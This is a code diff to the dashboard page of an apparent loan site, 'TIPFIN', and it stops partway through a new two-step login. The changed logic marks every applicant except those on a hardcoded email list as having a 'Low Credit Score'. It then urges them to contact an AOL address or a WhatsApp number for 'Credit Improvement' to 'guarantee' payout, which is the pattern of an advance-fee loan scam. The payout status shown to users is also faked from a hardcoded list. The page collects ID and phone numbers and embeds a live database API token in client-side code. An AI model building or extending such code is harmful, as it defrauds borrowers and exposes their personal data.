@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-widtah, initial-scale=1"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
 <title>Dashboard — TIPFIN</title>
 <link rel="icon" type="image/png" href="logo.png"/>
 <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -105,6 +105,7 @@ section{padding:50px 0}
   outline:none;width:100%}
 .field input:focus,.field select:focus,.field textarea:focus{background:#fff;border-color:var(--brand);box-shadow:0 0 0 4px var(--brand-soft)}
 .field .hint{font-size:.75rem;color:var(--muted)}
+.field input.err-field{border-color:#e53e3e;background:#fff5f5}
 
 /* Callouts */
 .callout{padding:12px 14px;border-radius:12px;font-size:.86rem;font-weight:600;margin-bottom:12px}
@@ -204,6 +205,7 @@ body{padding-bottom:80px}
   background:#fff;border:3px solid var(--line)}
 .timeline .ev.done::before{border-color:var(--ok);background:var(--ok)}
 .timeline .ev.now::before{border-color:var(--brand);background:#fff;box-shadow:0 0 0 5px var(--brand-soft)}
+.timeline .ev.warn-ev::before{border-color:var(--warn);background:var(--warn)}
 .timeline .ev .t{font-weight:700}
 .timeline .ev .s{font-size:.84rem;color:var(--muted)}
 
@@ -213,12 +215,28 @@ body{padding-bottom:80px}
 .badge.warn{background:#fff4e0;color:#92580a}
 .badge.info{background:#e6f4fd;color:#0a4f7a}
 .badge.muted{background:#eef2f6;color:#4a5666}
+.badge.err{background:#fdecea;color:#9a1f17}
 
 /* Auth shell (login gate) */
 .auth-shell{min-height:calc(100vh - 64px);display:flex;align-items:center;justify-content:center;padding:32px 16px}
 .auth-card{background:#fff;border:1px solid var(--line);border-radius:24px;padding:30px;width:100%;max-width:480px;box-shadow:var(--shadow-lg)}
 .auth-card h1{font-size:1.6rem;text-align:center;margin-bottom:6px}
 .auth-card .sub{text-align:center;color:var(--muted);margin-bottom:22px;font-size:.92rem}
+
+/* Step indicator */
+.step-indicator{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:22px}
+.step-dot{width:28px;height:28px;border-radius:50%;display:grid;place-items:center;font-size:.76rem;font-weight:800;transition:.3s}
+.step-dot.active{background:var(--grad);color:#fff;box-shadow:0 4px 12px rgba(216,54,42,.4)}
+.step-dot.done{background:var(--ok);color:#fff}
+.step-dot.idle{background:#eef2f6;color:var(--muted)}
+.step-line{width:32px;height:2px;background:#eef2f6;border-radius:2px}
+.step-line.done{background:var(--ok)}
+
+/* Low credit alert banner */
+.low-credit-banner{background:linear-gradient(135deg,#fff7e6,#fff0d4);border:2px solid var(--warn);
+  border-radius:var(--radius);padding:20px 22px;margin-bottom:0}
+.low-credit-banner .lc-title{font-size:1rem;font-weight:800;color:#7a4d05;margin-bottom:6px;display:flex;align-items:center;gap:8px}
+.low-credit-banner p{margin:0;color:#92580a;font-size:.9rem;line-height:1.55}
 
 /* Mobile polish */
 @media(max-width:899px){
@@ -258,14 +276,12 @@ body{padding-bottom:80px}
       <a data-nav="contact.html" href="contact.html">Contact</a>
     </nav>
     <div class="header-cta">
-      <span data-online-users></span>
       <span data-auth-cta></span>
     </div>
     <button class="hamburger" id="hamburger" aria-label="Open menu" aria-expanded="false">
       <span></span><span></span><span></span>
     </button>
   </div>
-  <div class="header-mobile-online"><span data-online-users></span></div>
   <div class="mobile-menu" id="mobile-menu" hidden>
     <a data-nav="index.html" href="index.html">🏠 Home</a>
     <a data-nav="loans.html" href="loans.html">💰 Loan Products</a>
@@ -286,7 +302,9 @@ body{padding-bottom:80px}
   </div>
 </header>
 
-<!-- LOGIN GATE — shown when no session exists -->
+<!-- ══════════════════════════════════════════════
+     LOGIN GATE — Step 1: Email
+     ══════════════════════════════════════════════ -->
 <div id="login-gate" style="display:none">
   <div class="auth-shell">
     <div class="auth-card">
@@ -295,22 +313,58 @@ body{padding-bottom:80px}
         <h1>View your dashboard</h1>
         <p class="sub">Enter the email address you used when applying to load your application status.</p>
       </div>
-      <div id="gate-msg"></div>
-      <div class="field">
-        <label>Email Address *</label>
-        <input type="email" id="gate-email" placeholder="name@example.com" autocomplete="email"/>
+
+      <!-- Step indicator -->
+      <div class="step-indicator">
+        <div class="step-dot active" id="step-dot-1">1</div>
+        <div class="step-line" id="step-line-1"></div>
+        <div class="step-dot idle" id="step-dot-2">2</div>
       </div>
-      <button class="btn btn-primary btn-block" id="gate-btn" onclick="gateLogin()">
-        <span id="gate-btn-text">Load my dashboard</span>
-      </button>
-      <p style="text-align:center;margin-top:16px;font-size:.88rem;color:var(--muted)">
-        Haven't applied yet? <a href="apply.html" style="color:var(--brand);font-weight:700">Apply now →</a>
-      </p>
+
+      <!-- Step 1: Email -->
+      <div id="step1-wrap">
+        <div id="gate-msg"></div>
+        <div class="field">
+          <label>Email Address *</label>
+          <input type="email" id="gate-email" placeholder="name@example.com" autocomplete="email"/>
+        </div>
+        <button class="btn btn-primary btn-block" id="gate-btn" onclick="gateStep1()">
+          <span id="gate-btn-text">Load my dashboard</span>
+        </button>
+        <p style="text-align:center;margin-top:16px;font-size:.88rem;color:var(--muted)">
+          Haven't applied yet? <a href="apply.html" style="color:var(--brand);font-weight:700">Apply now →</a>
+        </p>
+      </div>
+
+      <!-- Step 2: ID + Phone verification -->
+      <div id="step2-wrap" style="display:none">
+        <div id="verify-msg"></div>
+        <p style="font-size:.9rem;color:var(--ink-soft);margin-bottom:18px">
+          We found your application. Please verify your identity to continue.
+        </p>
+        <div class="field">
+          <label>ID / Passport Number *</label>
+          <input type="text" id="verify-id" placeholder="Enter your ID or passport number" autocomplete="off"/>
+        </div>
+        <div class="field">
+          <label>Phone Number *</label>
+          <input type="tel" id="verify-phone" placeholder="e.g. +27712345678" autocomplete="tel"/>
+        </div>
+        <button class="btn btn-primary btn-block" id="verify-btn" onclick="gateStep2()">
+          <span id="verify-btn-text">Verify &amp; Sign In</span>
+        </button>
+        <button class="btn btn-ghost btn-block" style="margin-top:10px" onclick="backToStep1()">
+          ← Use a different email
+        </button>
+      </div>
+
     </div>
   </div>
 </div>
 
-<!-- DASHBOARD — shown when session exists -->
+<!-- ══════════════════════════════════════════════
+     DASHBOARD — shown when session exists
+     ══════════════════════════════════════════════ -->
 <div id="dash-view" style="display:none">
   <section style="padding-top:14px">
     <div class="container">
@@ -330,6 +384,7 @@ body{padding-bottom:80px}
         </aside>
 
         <div class="main">
+          <!-- Welcome / status card -->
           <div class="card reveal" style="padding:24px">
             <div style="display:flex;justify-content:space-between;align-items:start;flex-wrap:wrap;gap:14px">
               <div>
@@ -341,6 +396,19 @@ body{padding-bottom:80px}
             </div>
           </div>
 
+          <!-- Low Credit Score Alert Banner -->
+          <div class="low-credit-banner reveal" id="low-credit-alert" style="display:none">
+            <div class="lc-title">⚠️ Low Credit Score Detected</div>
+            <p>
+              Our system has detected a <strong>low credit score</strong> on your profile.
+              To guarantee your loan payout, you must complete our <strong>Credit Score Improvement</strong> process with TIPFIN.<br/><br/>
+              <strong>Contact TIPFIN immediately to begin Credit Improvement and guarantee your payout:</strong><br/>
+              📧 <a href="mailto:info.tipfin@aol.com" style="color:#92580a;font-weight:700">info.tipfin@aol.com</a> &nbsp;·&nbsp;
+              📱 <a href="https://wa.me/27634991361?text=Hi%20TIPFIN%2C%20I%20need%20Credit%20Improvement%20for%20my%20loan%20payout." target="_blank" rel="noopener" style="color:#92580a;font-weight:700">WhatsApp: +27634991361</a>
+            </p>
+          </div>
+
+          <!-- KPIs -->
           <div class="kpis reveal">
             <div class="kpi"><div class="lbl">Loan amount</div><div class="num" id="k-amount">—</div></div>
             <div class="kpi"><div class="lbl">Loan type</div><div class="num" id="k-type" style="font-size:1rem">—</div></div>
@@ -348,7 +416,7 @@ body{padding-bottom:80px}
             <div class="kpi"><div class="lbl" id="k-monthly-lbl">Monthly payment</div><div class="num" id="k-monthly">—</div></div>
           </div>
 
-          <!-- Repayment breakdown card — shown when loan data exists -->
+          <!-- Repayment breakdown card -->
           <div class="card reveal" id="d-repay-card" style="display:none">
             <h3>Repayment breakdown <span style="font-size:.75rem;font-weight:600;color:var(--muted);margin-left:8px">Fixed 5% interest</span></h3>
             <div style="display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:14px">
@@ -370,9 +438,11 @@ body{padding-bottom:80px}
               </div>
             </div>
             <p class="muted" style="font-size:.8rem;margin-top:12px;margin-bottom:0">
-              Amount: (<span id="d-repay-principal2" style="font-weight:1">principal</span> ) + = <span id="d-repay-total2" style="font-weight:1">total</span> <span id="d-repay-months">—</span>            </p>
+              Principal: <span id="d-repay-principal2">—</span> + 5% interest = Total: <span id="d-repay-total2">—</span> over <span id="d-repay-months">—</span>
+            </p>
           </div>
 
+          <!-- Approval progress -->
           <div class="card reveal">
             <h3>Approval progress</h3>
             <div style="display:flex;justify-content:space-between;align-items:center;margin-top:6px">
@@ -383,11 +453,13 @@ body{padding-bottom:80px}
             <div id="prog-eta" class="muted small" style="margin-top:8px"></div>
           </div>
 
+          <!-- Application timeline -->
           <div class="card reveal">
             <h3>Application timeline</h3>
             <div class="timeline" style="margin-top:12px" id="d-timeline"></div>
           </div>
 
+          <!-- Document status + payout notice -->
           <div class="grid cols-2 reveal">
             <div class="card">
               <h3>Document status</h3>
@@ -401,15 +473,19 @@ body{padding-bottom:80px}
             </div>
             <div class="card">
               <h3>Important payout notice</h3>
-              <p>After approval and verification, contact <strong>TIPFIN (PTY) LTD</strong> to finalize your Credit Improvement & payout on email info.tipfin@aol.com. TipfIn Improvement and payout W.A 27634991361 </p>
+              <p>After approval and credit improvement, contact <strong>TIPFIN (PTY) LTD</strong> to finalise your payout.</p>
+              <div style="margin-bottom:14px">
+                <div style="font-size:.72rem;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px">Payout status</div>
+                <div id="payout-status-badge" class="badge muted">Pending</div>
+              </div>
               <div style="display:flex;gap:8px;flex-wrap:wrap">
-                <a class="btn btn-primary" href="contact.html">Contact TIPFIN</a>
+                <a class="btn btn-primary" href="mailto:info.tipfin@aol.com">Contact TIPFIN</a>
                 <a class="btn btn-ghost" href="https://wa.me/27634991361?text=Hi%20TipFin%2C%20I%20want%20to%20complete%20my%20payout." target="_blank" rel="noopener" style="border-color:#25D366;color:#0d8d3f">WhatsApp</a>
               </div>
             </div>
           </div>
 
-          <!-- Baserow data detail card -->
+          <!-- Application detail card -->
           <div class="card reveal" id="d-detail-card" style="display:none">
             <h3>Your application details</h3>
             <div id="d-detail-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:10px 18px;margin-top:14px"></div>
@@ -507,37 +583,28 @@ body{padding-bottom:80px}
 </a>
 
 <script>
-/* ═══════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════
+   ADMIN CONTROL — Add emails below to grant Approved status.
+   APPROVED_EMAILS : these users will see "Approved" on their dashboard.
+   PAYOUT_EMAILS   : these users will see payout as completed.
+   Email comparison is case-insensitive.
+   ═══════════════════════════════════════════════════════════════ */
+const APPROVED_EMAILS = [
+  /* example: "user@example.com", */
+];
+
+const PAYOUT_EMAILS = [
+  /* example: "user@example.com", */
+];
+
+/* ═══════════════════════════════════════════════════════════════
    BASEROW CONFIG — Table 936442
-   ═══════════════════════════════════════════════════════ */
+   ═══════════════════════════════════════════════════════════════ */
 const BASEROW_TOKEN = "LG6hnTBxgBG78FueElsSwpHRd4Wep1oL";
 const BASEROW_TABLE = 936442;
 const BASEROW_API   = "https://api.baserow.io/api/database/rows/table/" + BASEROW_TABLE + "/";
 
-/* ─── Baserow value extractor ────────────────────────────────
-   Baserow can return fields as:
-     plain string/number  → use as-is
-     single-select obj    → { id, value, color }  → .value
-     multiple-select arr  → [{ value }]            → join
-     link-row arr         → [{ id, value }]        → .value
-   bVal() normalises all of these to a plain string.          */
-function bVal(v){
-  if (v === null || v === undefined) return "";
-  if (typeof v === "number") return String(v);
-  if (typeof v === "string") return v;
-  if (Array.isArray(v)){
-    if (v.length === 0) return "";
-    /* multi-select or link-row */
-    return v.map(i => (i && typeof i === "object") ? (i.value || i.name || "") : String(i)).filter(Boolean).join(", ");
-  }
-  if (typeof v === "object"){
-    /* single-select choice object */
-    return v.value || v.name || "";
-  }
-  return String(v);
-}
-
-/* Correct field mapping — field_XXXXX format required by Baserow */
+/* Field mapping */
 const FIELDS = {
   name:           "field_8136507",
   lastname:       "field_8136508",
@@ -558,9 +625,30 @@ const FIELDS = {
   address:        "field_8203100",
 };
 
-/* ═══════════════════════════════════════════════════════
+/* ─── Baserow value extractor ─── */
+function bVal(v){
+  if (v === null || v === undefined) return "";
+  if (typeof v === "number") return String(v);
+  if (typeof v === "string") return v;
+  if (Array.isArray(v)){
+    if (v.length === 0) return "";
+    return v.map(i => (i && typeof i === "object") ? (i.value || i.name || "") : String(i)).filter(Boolean).join(", ");
+  }
+  if (typeof v === "object") return v.value || v.name || "";
+  return String(v);
+}
+
+/* ─── Normalise a phone/ID for comparison: digits only ─── */
+function normalise(str){
+  return String(str || "").replace(/\D/g, "").trim().toLowerCase();
+}
+function normStr(str){
+  return String(str || "").replace(/\s+/g,"").trim().toLowerCase();
+}
+
+/* ═══════════════════════════════════════════════════════════════
    SESSION helpers
-   ═══════════════════════════════════════════════════════ */
+   ═══════════════════════════════════════════════════════════════ */
 const Session = {
   KEY: "tipfin_user",
   get(){ try{ return JSON.parse(localStorage.getItem(this.KEY)||"null"); }catch(_){ return null; } },
@@ -568,10 +656,12 @@ const Session = {
   clear(){ localStorage.removeItem(this.KEY); },
 };
 
-/* ═══════════════════════════════════════════════════════
-   BASEROW helpers — search by email using field IDs
-   user_field_names=false  → Baserow returns field_XXXXXX keys (required)
-   ═══════════════════════════════════════════════════════ */
+/* Temp hold during 2-step login (not persisted) */
+let _pendingRow = null;
+
+/* ═══════════════════════════════════════════════════════════════
+   BASEROW helpers
+   ═══════════════════════════════════════════════════════════════ */
 async function findRowByEmail(email){
   const params = new URLSearchParams({
     "filter__field_8136510__equal": email.trim().toLowerCase(),
@@ -602,17 +692,11 @@ async function getRowById(rowId){
   return res.json();
 }
 
-/* Map a raw Baserow row (field IDs) to a clean user object.
-   Every field is passed through bVal() so single-select objects,
-   number fields and plain strings all become consistent strings. */
 function rowToUser(row, existingSession){
   const base = existingSession || {};
-  /* File-array fields are kept as arrays, not passed through bVal */
-  const idDocArr   = Array.isArray(row[FIELDS.IdDoc])    ? row[FIELDS.IdDoc]    : [];
+  const idDocArr   = Array.isArray(row[FIELDS.IdDoc])     ? row[FIELDS.IdDoc]     : [];
   const bankDocArr = Array.isArray(row[FIELDS.Bankstate]) ? row[FIELDS.Bankstate] : [];
-
-  const g = (key) => bVal(row[key]);  /* convenience getter */
-
+  const g = (key) => bVal(row[key]);
   return {
     ...base,
     rowId:          row.id,
@@ -642,11 +726,10 @@ function rowToUser(row, existingSession){
   };
 }
 
-/* ═══════════════════════════════════════════════════════
-   CURRENCY helpers — handles both country name AND code
-   ═══════════════════════════════════════════════════════ */
+/* ═══════════════════════════════════════════════════════════════
+   CURRENCY helpers
+   ═══════════════════════════════════════════════════════════════ */
 const COUNTRY_CURRENCY = {
-  /* Full names */
   "South Africa":{sym:"R",code:"ZAR"},"Botswana":{sym:"P",code:"BWP"},
   "Namibia":{sym:"N$",code:"NAD"},"Zimbabwe":{sym:"Z$",code:"ZWL"},
   "Nigeria":{sym:"₦",code:"NGN"},"Ghana":{sym:"₵",code:"GHS"},
@@ -657,7 +740,6 @@ const COUNTRY_CURRENCY = {
   "United States":{sym:"$",code:"USD"},"United Kingdom":{sym:"£",code:"GBP"},
   "Canada":{sym:"C$",code:"CAD"},"Australia":{sym:"A$",code:"AUD"},
   "India":{sym:"₹",code:"INR"},"Other":{sym:"$",code:"USD"},
-  /* 2-letter codes (fallback for old rows that stored the code) */
   "ZA":{sym:"R",code:"ZAR"},"BW":{sym:"P",code:"BWP"},
   "NA":{sym:"N$",code:"NAD"},"ZW":{sym:"Z$",code:"ZWL"},
   "NG":{sym:"₦",code:"NGN"},"GH":{sym:"₵",code:"GHS"},
@@ -680,10 +762,6 @@ function fmtMoney(amount, country){
 }
 function trunc2(n){ return Math.floor((Number(n)||0)*100)/100; }
 
-/* ─── Repayment calculation: fixed 5% interest ──────────────
-   total = principal + (principal × 5%)  = principal × 1.05
-   monthly = total ÷ months
-   Example: 10 000 + 500 = 10 500 ÷ 12 = 875.00 / month     */
 function calcRepayment(amount, months){
   const principal = Number(amount) || 0;
   const m         = Number(months)  || 0;
@@ -694,31 +772,35 @@ function calcRepayment(amount, months){
   return { principal, interest, total, monthly, months: m };
 }
 
-/* ═══════════════════════════════════════════════════════
+/* ═══════════════════════════════════════════════════════════════
    APPROVAL STATE
-   ═══════════════════════════════════════════════════════ */
-const FIRST_REVIEW_MS = 30 * 60 * 1000;
-const INSTANT_APPROVE_DAYS = 30;
-
-function approvalState(u){
-  if (!u || !u.hasApplied) return { state:"not-applied", pct:5, etaMin:0 };
-  const now = Date.now();
-  const dayMs = 24*60*60*1000;
-  const isReturning = u.priorLoginAt && (now - u.priorLoginAt) < (INSTANT_APPROVE_DAYS * dayMs);
-  if (isReturning) return { state:"approved", pct:100, etaMin:0 };
-  const elapsed = now - (u.firstLoginAt || now);
-  if (elapsed >= FIRST_REVIEW_MS) return { state:"approved", pct:100, etaMin:0 };
-  const remaining = FIRST_REVIEW_MS - elapsed;
-  return {
-    state: "reviewing",
-    pct: Math.min(95, Math.floor(20 + (elapsed / FIRST_REVIEW_MS) * 70)),
-    etaMin: Math.ceil(remaining / 60000)
-  };
+   Logic:
+     - If email is in APPROVED_EMAILS → "approved"
+     - Otherwise on first login → instant "low_credit" (shown right away)
+     - The timeline still shows the 10-min / 20-min stages as historical markers
+   ═══════════════════════════════════════════════════════════════ */
+function isInList(email, list){
+  const e = (email||"").trim().toLowerCase();
+  return list.map(x => (x||"").trim().toLowerCase()).includes(e);
 }
 
-/* ═══════════════════════════════════════════════════════
+function approvalState(u){
+  if (!u || !u.hasApplied) return { state:"not-applied", pct:5 };
+
+  const email = (u.email||"").trim().toLowerCase();
+
+  /* Admin override: email is in the approved list */
+  if (isInList(email, APPROVED_EMAILS)){
+    return { state:"approved", pct:100 };
+  }
+
+  /* All other logged-in users: instant low_credit */
+  return { state:"low_credit", pct:65 };
+}
+
+/* ═══════════════════════════════════════════════════════════════
    RENDER dashboard
-   ═══════════════════════════════════════════════════════ */
+   ═══════════════════════════════════════════════════════════════ */
 function render(u){
   const initial = (u.name?.[0] || u.email?.[0] || "U").toUpperCase();
   document.getElementById("d-avatar").textContent = initial;
@@ -728,6 +810,11 @@ function render(u){
   document.getElementById("d-greet").textContent = "Hello, " + (u.name || "there") + " 👋";
 
   const ap = approvalState(u);
+  const email = (u.email||"").trim().toLowerCase();
+  const hasPayoutEmail = isInList(email, PAYOUT_EMAILS);
+
+  /* ─── Status banner + progress ─── */
+  const lowCreditAlert = document.getElementById("low-credit-alert");
 
   if (ap.state === "not-applied"){
     document.getElementById("d-summary").textContent = "You haven't applied yet — finish your application to start tracking.";
@@ -735,39 +822,58 @@ function render(u){
     document.getElementById("d-status").className    = "badge muted";
     document.getElementById("prog-label").textContent = "No application yet";
     document.getElementById("prog-eta").textContent   = "Apply now to start tracking.";
-  } else if (ap.state === "reviewing"){
-    document.getElementById("d-summary").textContent = "Your application is being verified. First-time approval takes up to 30 minutes.";
-    document.getElementById("d-status").textContent  = "Under review";
+    if (lowCreditAlert) lowCreditAlert.style.display = "none";
+
+  } else if (ap.state === "low_credit"){
+    document.getElementById("d-summary").textContent = "Low credit score detected on your profile. Contact TIPFIN to complete Credit Improvement and guarantee your payout.";
+    document.getElementById("d-status").textContent  = "Low Credit Score Detected";
     document.getElementById("d-status").className    = "badge warn";
-    document.getElementById("prog-label").textContent = "Verification in progress";
-    document.getElementById("prog-eta").textContent   = "Estimated time remaining: " + ap.etaMin + " min";
+    document.getElementById("prog-label").textContent = "Approval awaiting — pending completion of low credit score";
+    document.getElementById("prog-eta").textContent   = "Contact TIPFIN to proceed with Credit Improvement and payout.";
+    if (lowCreditAlert) lowCreditAlert.style.display = "";
+
   } else {
-    document.getElementById("d-summary").textContent = "Your application has been approved. Contact TIPFIN Payout to complete Improvement and payout Email us Info.tipfin@aol.com. W.A 27634991361 ";
-    document.getElementById("d-status").textContent  = "Approved · Awaiting TIPFIN";
+    /* approved */
+    document.getElementById("d-summary").textContent = "Your application has been approved. Contact TIPFIN to complete your Credit Improvement and finalise your payout.";
+    document.getElementById("d-status").textContent  = "Approved";
     document.getElementById("d-status").className    = "badge ok";
     document.getElementById("prog-label").textContent = "Approved";
-    document.getElementById("prog-eta").textContent   = "Awaiting Final payout  by TIPFIN (PTY) LTD.";
+    document.getElementById("prog-eta").textContent   = "Awaiting final payout by TIPFIN (PTY) LTD.";
+    if (lowCreditAlert) lowCreditAlert.style.display = "none";
   }
 
   setTimeout(()=>{
-    document.getElementById("prog-bar").style.width   = ap.pct + "%";
-    document.getElementById("prog-pct").textContent   = ap.pct + "%";
+    document.getElementById("prog-bar").style.width = ap.pct + "%";
+    document.getElementById("prog-pct").textContent = ap.pct + "%";
   }, 200);
 
-  /* KPIs — robust parsing handles formatted strings like "10 000" or "R10,000" */
+  /* ─── Payout status badge ─── */
+  const payoutBadge = document.getElementById("payout-status-badge");
+  if (payoutBadge){
+    if (hasPayoutEmail){
+      payoutBadge.textContent = "Payout Completed ✓";
+      payoutBadge.className   = "badge ok";
+    } else {
+      payoutBadge.textContent = "Pending";
+      payoutBadge.className   = "badge muted";
+    }
+  }
+
+  /* ─── KPIs ─── */
   const rawAmt    = String(u.loanAmount || "").replace(/[^0-9.]/g, "");
   const amount    = parseFloat(rawAmt) || 0;
   const termRaw   = String(u.loanTearm || "");
   const termMatch = termRaw.match(/\d+/);
   const term      = termMatch ? parseInt(termMatch[0]) : 0;
-  /* Display term: if stored value already contains "month" show it as-is, else append */
   const termDisplay = termRaw.trim()
     ? (/month/i.test(termRaw) ? termRaw.trim() : termRaw.trim() + " months")
     : "—";
-  const repay     = calcRepayment(amount, term);
+  const repay = calcRepayment(amount, term);
+
   document.getElementById("k-amount").textContent = amount ? fmtMoney(amount, u.country) : "—";
   document.getElementById("k-type").textContent   = u.loanType || u.loanPurpose || "—";
   document.getElementById("k-term").textContent   = termDisplay;
+
   const isUnemp = (u.employ||"").toLowerCase().includes("unemploy");
   if (isUnemp){
     document.getElementById("k-monthly-lbl").textContent = "Status";
@@ -781,16 +887,16 @@ function render(u){
     document.getElementById("k-monthly").textContent = "—";
   }
 
-  /* Repayment breakdown card */
+  /* ─── Repayment breakdown ─── */
   const repayCard = document.getElementById("d-repay-card");
   if (repay && repayCard){
     repayCard.style.display = "";
     const p = fmtMoney(repay.principal, u.country);
-    const t = fmtMoney(repay.total,     u.country);
+    const t = fmtMoney(repay.total, u.country);
     document.getElementById("d-repay-principal").textContent  = p;
     document.getElementById("d-repay-interest").textContent   = fmtMoney(repay.interest, u.country);
     document.getElementById("d-repay-total").textContent      = t;
-    document.getElementById("d-repay-monthly").textContent    = fmtMoney(repay.monthly,  u.country);
+    document.getElementById("d-repay-monthly").textContent    = fmtMoney(repay.monthly, u.country);
     document.getElementById("d-repay-months").textContent     = repay.months + " months";
     document.getElementById("d-repay-principal2").textContent = p;
     document.getElementById("d-repay-total2").textContent     = t;
@@ -798,32 +904,61 @@ function render(u){
     repayCard.style.display = "none";
   }
 
-  /* Timeline */
-  const events = [
-    { t:"Application submitted", s: u.appliedAt ? new Date(u.appliedAt).toLocaleString() : (u.hasApplied ? "Submitted" : "Pending"), state: u.hasApplied ? "done" : "" },
-    { t:"Documents uploaded",    s: u.hasApplied ? "Uploaded" : "Pending",                                                           state: u.hasApplied ? "done" : "" },
-    { t:"Under review",          s: ap.state==="reviewing" ? "In progress" : (u.hasApplied ? "Complete" : "Pending"),                state: u.hasApplied ? (ap.state==="reviewing" ? "now" : "done") : "" },
-    { t:"Approved",              s: ap.state==="approved" ? "Approved" : "Awaiting",                                                 state: ap.state==="approved" ? "done" : "" },
-    { t:"Awaiting TIPFIN payout",s: ap.state==="approved" ? "Contact TIPFIN to complete credit improvement, contract and payout" : "Pending",                         state: ap.state==="approved" ? "now" : "" },
-  ];
+  /* ─── Timeline ─── */
+  /*
+    Stages (always shown in this order for applied users):
+    1. Application submitted   — done
+    2. Under review (~10 min)  — done
+    3. Low Credit Score Detected — current (now) for low_credit state
+    4. Approval               — done if approved, else "Awaiting — pending low credit completion"
+    5. Payout                 — pending / completed
+  */
+  let events;
+  if (!u.hasApplied){
+    events = [
+      { t:"Application submitted",        s:"Not yet submitted",                          state:"" },
+      { t:"Under review (~10 mins)",       s:"Pending",                                   state:"" },
+      { t:"Low Credit Score Check",        s:"Pending",                                   state:"" },
+      { t:"Approval",                      s:"Pending",                                   state:"" },
+      { t:"Payout",                        s:"Pending",                                   state:"" },
+    ];
+  } else if (ap.state === "low_credit"){
+    events = [
+      { t:"Application submitted",         s:"Submitted ✓",                              state:"done" },
+      { t:"Documents uploaded",            s:"Uploaded ✓",                               state:"done" },
+      { t:"Under review",                  s:"Completed ✓",                              state:"done" },
+      { t:"⚠️ Low Credit Score Detected",  s:"Contact TIPFIN for Credit Improvement",    state:"now"  },
+      { t:"Approval",                      s:"Awaiting — pending completion of low credit score", state:"" },
+      { t:"Payout",                        s: hasPayoutEmail ? "Completed ✓" : "Pending — contact TIPFIN", state: hasPayoutEmail ? "done" : "" },
+    ];
+  } else {
+    /* approved */
+    events = [
+      { t:"Application submitted",         s:"Submitted ✓",                              state:"done" },
+      { t:"Documents uploaded",            s:"Uploaded ✓",                               state:"done" },
+      { t:"Under review",                  s:"Completed ✓",                              state:"done" },
+      { t:"Low Credit Score Check",        s:"Completed ✓",                              state:"done" },
+      { t:"Approved ✓",                    s:"Application approved",                     state:"done" },
+      { t:"Payout",                        s: hasPayoutEmail ? "Completed ✓" : "Contact TIPFIN to finalise", state: hasPayoutEmail ? "done" : "now" },
+    ];
+  }
+
   document.getElementById("d-timeline").innerHTML = events.map(e=>
     `<div class="ev ${e.state}"><div class="t">${e.t}</div><div class="s">${e.s}</div></div>`
   ).join("");
 
-  /* Document status */
+  /* ─── Document status ─── */
   const docs = [
     { label:"ID Document",             badge: u.idDocName   ? "ok"   : "muted", state: u.idDocName   ? "Successfully uploaded" : "Not uploaded" },
     { label:"Bank Statement / Payslip", badge: u.bankDocName ? "ok"   : "muted", state: u.bankDocName ? "Successfully uploaded" : "Not uploaded" },
-    { label:"Approval Letter",          badge: ap.state==="approved" ? "info" : "muted", state: ap.state==="approved" ? "Ready — contact us" : "Pending", isContact: ap.state==="approved" },
+    { label:"Approval Letter",          badge: ap.state==="approved" ? "ok" : (ap.state==="low_credit" ? "warn" : "muted"),
+                                        state: ap.state==="approved" ? "Ready — contact TIPFIN" : (ap.state==="low_credit" ? "Pending — credit improvement required" : "Pending") },
   ];
-  document.getElementById("d-docs").innerHTML = docs.map(d=>{
-    const right = d.isContact
-      ? `<a class="badge ${d.badge}" href="contact.html" style="text-decoration:none">${d.state}</a>`
-      : `<span class="badge ${d.badge}">${d.state}</span>`;
-    return `<li style="display:flex;justify-content:space-between;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid var(--line)"><span style="font-weight:600">${d.label}</span> ${right}</li>`;
-  }).join("");
+  document.getElementById("d-docs").innerHTML = docs.map(d=>
+    `<li style="display:flex;justify-content:space-between;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid var(--line)"><span style="font-weight:600">${d.label}</span> <span class="badge ${d.badge}">${d.state}</span></li>`
+  ).join("");
 
-  /* Application detail card — shows real Baserow data */
+  /* ─── Application detail card ─── */
   const details = [
     ["Full name",         fullName || "—"],
     ["Email",             u.email || "—"],
@@ -853,10 +988,14 @@ function render(u){
   }
 }
 
-/* ═══════════════════════════════════════════════════════
-   GATE LOGIN — look up by email in Baserow
-   ═══════════════════════════════════════════════════════ */
-async function gateLogin(){
+/* ═══════════════════════════════════════════════════════════════
+   2-STEP LOGIN GATE
+   Step 1: Enter email → fetch from Baserow
+   Step 2: Enter ID + Phone → verify against Baserow data → login
+   ═══════════════════════════════════════════════════════════════ */
+
+/* ── Step 1: Email lookup ── */
+async function gateStep1(){
   const emailEl = document.getElementById("gate-email");
   const msgEl   = document.getElementById("gate-msg");
   const btnEl   = document.getElementById("gate-btn");
@@ -864,8 +1003,11 @@ async function gateLogin(){
   const email   = (emailEl.value || "").trim().toLowerCase();
 
   msgEl.innerHTML = "";
+  emailEl.classList.remove("err-field");
+
   if (!email || !email.includes("@")){
     msgEl.innerHTML = '<div class="callout err">Please enter a valid email address.</div>';
+    emailEl.classList.add("err-field");
     emailEl.focus();
     return;
   }
@@ -881,26 +1023,132 @@ async function gateLogin(){
       btnTxt.textContent = "Load my dashboard";
       return;
     }
-    const user = rowToUser(row, { email });
-    Session.set(user);
-    showDashboard(user);
-    paintHeaderAuth(user);
-    render(user);
+    /* Found — store row temporarily and proceed to step 2 */
+    _pendingRow = row;
+    showStep2();
   } catch(err){
-    msgEl.innerHTML = `<div class="callout err">❌ Could not connect to Baserow: ${err.message}</div>`;
+    msgEl.innerHTML = `<div class="callout err">Could not connect to verify your application: ${err.message}</div>`;
     btnEl.disabled = false;
     btnTxt.textContent = "Load my dashboard";
   }
 }
 
-/* Allow pressing Enter in the email field */
+/* ── Step 2: Verify ID + Phone ── */
+async function gateStep2(){
+  const idEl    = document.getElementById("verify-id");
+  const phoneEl = document.getElementById("verify-phone");
+  const msgEl   = document.getElementById("verify-msg");
+  const btnEl   = document.getElementById("verify-btn");
+  const btnTxt  = document.getElementById("verify-btn-text");
+
+  const enteredId    = (idEl.value    || "").trim();
+  const enteredPhone = (phoneEl.value || "").trim();
+
